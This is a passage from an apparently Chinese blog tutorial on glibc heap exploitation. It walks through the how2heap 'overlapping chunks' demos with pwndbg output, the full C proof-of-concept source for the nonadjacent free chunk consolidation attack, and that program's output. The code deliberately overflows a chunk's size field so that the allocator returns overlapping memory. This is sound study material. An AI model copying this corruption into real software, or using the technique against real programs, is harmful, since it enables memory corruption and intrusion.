class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx p1<br><span class="hljs-number">0x603010</span>:       <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span>      <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span><br><span class="hljs-number">0x603020</span>:       <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span>      <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span><br><span class="hljs-number">0x603030</span>:       <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span>      <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span><br><span class="hljs-number">0x603040</span>:       <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span>      <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span><br><span class="hljs-number">0x603050</span>:       <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span>      <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx p2<br><span class="hljs-number">0x603110</span>:       <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span>      <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span><br><span class="hljs-number">0x603120</span>:       <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span>      <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span><br><span class="hljs-number">0x603130</span>:       <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span>      <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span><br><span class="hljs-number">0x603140</span>:       <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span>      <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span><br><span class="hljs-number">0x603150</span>:       <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span>      <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx p3<br><span class="hljs-number">0x603210</span>:       <span class="hljs-number">0</span>x33333<span class="hljs-number">33333333333</span>      <span class="hljs-number">0</span>x33333<span class="hljs-number">33333333333</span><br><span class="hljs-number">0x603220</span>:       <span class="hljs-number">0</span>x33333<span class="hljs-number">33333333333</span>      <span class="hljs-number">0</span>x33333<span class="hljs-number">33333333333</span><br><span class="hljs-number">0x603230</span>:       <span class="hljs-number">0</span>x33333<span class="hljs-number">33333333333</span>      <span class="hljs-number">0</span>x33333<span class="hljs-number">33333333333</span><br><span class="hljs-number">0x603240</span>:       <span class="hljs-number">0</span>x33333<span class="hljs-number">33333333333</span>      <span class="hljs-number">0</span>x33333<span class="hljs-number">33333333333</span><br><span class="hljs-number">0x603250</span>:       <span class="hljs-number">0</span>x33333<span class="hljs-number">33333333333</span>      <span class="hljs-number">0</span>x33333<span class="hljs-number">33333333333</span><br></code></pre></td></tr></table></figure><p>这些都没啥好看的,我们直接往下走,此时我们free掉了chunk2,chunk2被放进了unsorted bin中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x603100 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x603100<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">pwndbg</span>&gt;<br></code></pre></td></tr></table></figure><p>紧接着我们假设我们溢出了chunk1,成功修改了chunk2的size为0x181</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x603100</span><br><span class="hljs-number">0x603100</span>:       <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span>      <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000181</span><br><span class="hljs-number">0x603110</span>:       <span class="hljs-number">0</span>x00007ffff7dd1b78      <span class="hljs-number">0</span>x00007ffff7dd1b78<br><span class="hljs-number">0x603120</span>:       <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span>      <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span><br><span class="hljs-number">0x603130</span>:       <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span>      <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span><br><span class="hljs-number">0x603140</span>:       <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span>      <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span><br></code></pre></td></tr></table></figure><p>之后程序malloc了p4,此时的堆</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">257</span>,<br>  fd = <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span>,<br>  bk = <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span>,<br>  fd_nextsize = <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span>,<br>  bk_nextsize = <span class="hljs-number">0</span>x3<span class="hljs-number">131313131313131</span><br>&#125;<br><span class="hljs-number">0x603100</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">3544668469065756977</span>,<br>  size = <span class="hljs-number">385</span>,<br>  fd = <span class="hljs-number">0</span>x7ffff7dd1b78 &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  bk = <span class="hljs-number">0</span>x7ffff7dd1b78 &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span>,<br>  bk_nextsize = <span class="hljs-number">0</span>x3<span class="hljs-number">232323232323232</span><br>&#125;<br><span class="hljs-number">0x603280</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">3689348814741910323</span>,<br>  size = <span class="hljs-number">134529</span>,<br>  fd = <span class="hljs-number">0</span>x0,<br>  bk = <span class="hljs-number">0</span>x0,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到我们0x603100也就是p4的size是0x181,此时的p3,p4分别在</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x p3</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = 0x603210</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x p4</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">2 = 0x603110</span><br></code></pre></td></tr></table></figure><p>而这又意味这什么呢?</p><p>我们回想一下,p3的大小是0x100,而p4的大小为0x181,而这两个只相差0x100</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x 0x603210-0x603110</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">3 = 0x100</span><br></code></pre></td></tr></table></figure><p>这样我们就成功的构造了overlapping,也就是说,我们的p4将整个p3都包了进去</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>程序先是malloc了2个0x100大小的chunk,p1,p2,和一个大小为0x80的chunk,p3</p><p>紧接着,程序初始化了三个chunk,里面的值分别为1,2,3</p><p>之后程序free掉了p2,并假设拥有溢出的能力,通过溢出p1修改了p2的size域</p><p>此时p2的size是0x181,系统会认为我们有一个大小为0x180的在unsorted bin中的fake chunk</p><p>紧接着,我们再申请了一个大小为0x180的chunk p4,这样系统就会把我们unsorted bin中的free chunk也就是我们构造好的大小为0x180的fake chunk拿出来给p4</p><p>此时p4的后0x80的空间就和p3共享了,这就构成了overlapping_chunk! 堆重叠</p><h1 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h1><p>这里是overlapping的第二个,我们先看看源代码吧</p><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><p>我删除了一些无关语句,并加了一些注释(理解不对的地方多包涵2333</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br>  <span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;<br>  <span class="hljs-type">int</span> prev_in_use = <span class="hljs-number">0x1</span>;<br><br>  <span class="hljs-comment">//这个也被称为不相邻的free chunk conslidation 攻击(这里就不强翻了,没呢味儿</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nLet&#x27;s start to allocate 5 chunks on the heap:&quot;</span>);<br><br>  p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  <span class="hljs-comment">//malloc_usable_size函数可以获取chunk实际分配的内存大小</span><br>  real_size_p1 = <span class="hljs-built_in">malloc_usable_size</span>(p1);<br>  real_size_p2 = <span class="hljs-built_in">malloc_usable_size</span>(p2);<br>  real_size_p3 = <span class="hljs-built_in">malloc_usable_size</span>(p3);<br>  real_size_p4 = <span class="hljs-built_in">malloc_usable_size</span>(p4);<br>  real_size_p5 = <span class="hljs-built_in">malloc_usable_size</span>(p5);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\n\nchunk p1 from %p to %p&quot;</span>, p1, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1+<span class="hljs-built_in">malloc_usable_size</span>(p1));<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nchunk p2 from %p to %p&quot;</span>, p2,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p2+<span class="hljs-built_in">malloc_usable_size</span>(p2));<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nchunk p3 from %p to %p&quot;</span>, p3,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p3+<span class="hljs-built_in">malloc_usable_size</span>(p3));<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nchunk p4 from %p to %p&quot;</span>, p4, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p4+<span class="hljs-built_in">malloc_usable_size</span>(p4));<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nchunk p5 from %p to %p\n&quot;</span>, p5,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p5+<span class="hljs-built_in">malloc_usable_size</span>(p5));<br><br>  <span class="hljs-comment">//为了便于看攻击效果,所以五个chunk分别为A,B,C,D,E</span><br>  <span class="hljs-built_in">memset</span>(p1,<span class="hljs-string">&#x27;A&#x27;</span>,real_size_p1);<br>  <span class="hljs-built_in">memset</span>(p2,<span class="hljs-string">&#x27;B&#x27;</span>,real_size_p2);<br>  <span class="hljs-built_in">memset</span>(p3,<span class="hljs-string">&#x27;C&#x27;</span>,real_size_p3);<br>  <span class="hljs-built_in">memset</span>(p4,<span class="hljs-string">&#x27;D&#x27;</span>,real_size_p4);<br>  <span class="hljs-built_in">memset</span>(p5,<span class="hljs-string">&#x27;E&#x27;</span>,real_size_p5);<br><br>  <span class="hljs-comment">//我们现在Free一下p4,在有p5邻接top chunk的情况下,我们释放p4不会引起p4与top chunk的合并</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nLet&#x27;s free the chunk p4.\nIn this case this isn&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;</span>);<br><br>  <span class="hljs-built_in">free</span>(p4);<br><br>  <span class="hljs-comment">//现在我们通过溢出chunk p1将chunk p2的size改成p2+p3的大小并且将标注为设为正在使用来触发漏洞</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;</span>);<br><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>; <span class="hljs-comment">//&lt;--- BUG HERE</span><br><br>  现在我们再free p2,这个时候ptmalloc就会认为下一个chunk是<span class="hljs-built_in">p4</span>(p2的size已经被我们更改为p2+p3的大小了<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);<br>  <br>  <span class="hljs-comment">//这样就会创建一个大的错误包含p3的free chunk</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p2);<br><br>  <span class="hljs-comment">//现在我们再创建一个新的大小正好是我们创建的fake free chunk的新chunk</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);<br><br>  p6 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2000</span>);<br>  real_size_p6 = <span class="hljs-built_in">malloc_usable_size</span>(p6);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nchunk p6 from %p to %p&quot;</span>, p6,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p6+real_size_p6);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nchunk p3 from %p to %p\n&quot;</span>, p3, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) p3+real_size_p3);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nData inside chunk p3: \n\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-type">char</span> *)p3);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nLet&#x27;s write something inside p6\n&quot;</span>);<br>  <span class="hljs-built_in">memset</span>(p6,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-number">1500</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nData inside chunk p3: \n\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-type">char</span> *)p3);<br><br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">chunk p1 <span class="hljs-keyword">from</span> <span class="hljs-number">0</span>x220f010 <span class="hljs-keyword">to</span> <span class="hljs-number">0</span>x220f3f8<br>chunk p2 <span class="hljs-keyword">from</span> <span class="hljs-number">0</span>x220f400 <span class="hljs-keyword">to</span> <span class="hljs-number">0</span>x220f7e8<br>chunk p3 <span class="hljs-keyword">from</span> <span class="hljs-number">0</span>x220f7f0 <span class="hljs-keyword">to</span> <span class="hljs-number">0</span>x220fbd8<br>chunk p4 <span class="hljs-keyword">from</span> <span class="hljs-number">0</span>x220fbe0 <span class="hljs-keyword">to</span> <span class="hljs-number">0</span>x220ffc8<br>chunk p5 <span class="hljs-keyword">from</span> <span class="hljs-number">0</span>x220ffd0 <span class="hljs-keyword">to</span> <span class="hljs-number">0</span>x22103b8<br><br><span class="hljs-keyword">Let</span><span class="hljs-comment">&#x27;s free the chunk p4.</span><br><span class="hljs-keyword">In</span> this <span class="hljs-keyword">case</span> this isn<span class="hljs-comment">&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4</span><br><br><span class="hljs-keyword">Let</span><span class="hljs-comment">&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2</span><br><span class="hljs-keyword">with</span> the size <span class="hljs-keyword">of</span> chunk_p2 + size <span class="hljs-keyword">of</span> chunk_p3<br><br>Now during the free() operation <span class="hljs-keyword">on</span> p2, the allocator <span class="hljs-built_in">is</span> fooled <span class="hljs-keyword">to</span> think that<br>the nextchunk <span class="hljs-built_in">is</span> p4 ( since p2 + size_p2 now point <span class="hljs-keyword">to</span> p4 )<br><br>This operation will basically create a big free chunk that wrongly includes p3<br><br>Now <span class="hljs-keyword">let</span><span class="hljs-comment">&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk</span><br><br>Our malloc() has been satisfied <span class="hljs-keyword">by</span> our crafted big free chunk, now p6 <span class="hljs-built_in">and</span> p3 are overlapping <span class="hljs-built_in">and</span><br>we can overwrite data <span class="hljs-keyword">in</span> p3 <span class="hljs-keyword">by</span> writing <span class="hljs-keyword">on</span> chunk p6<br><br>chunk p6 <span class="hljs-keyword">from</span> <span class="hljs-number">0</span>x220f400 <span class="hljs-keyword">to</span> <span class="hljs-number">0</span>x220fbd8<br>chunk p3 <span class="hljs-keyword">from</span> <span class="hljs-number">0</span>x220f7f0 <span class="hljs-keyword">to</span> <span class="hljs-number">0</span>x220fbd8<br><br>Data inside chunk p3:<br><br>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC<br><br><span class="hljs-keyword">Let</span><span class="hljs-comment">&#x27;s write something inside p6</span><br><br>Data inside chunk p3:<br><br>FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC<br></code></pre></td></tr></table></figure><h2 id="关键部分调试"><a href="#关键部分调试" class="headerlink" title="关键部分调试"></a>关键部分调试</h2><p>因为和之前的很类似,这里我仅下几个断点</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">28</span>   p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  <span class="hljs-number">29</span>   p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  <span class="hljs-number">30</span>   p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  <span class="hljs-number">31</span>   p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  <span class="hljs-number">32</span><br>► <span class="hljs-number">33</span>   real_size_p1 = <span class="hljs-built_in">malloc_usable_size</span>(p1);<br><br>  <span class="hljs-number">53</span>   <span class="hljs-built_in">free</span>(p4);<br>  <span class="hljs-number">54</span><br>► <span class="hljs-number">55</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of 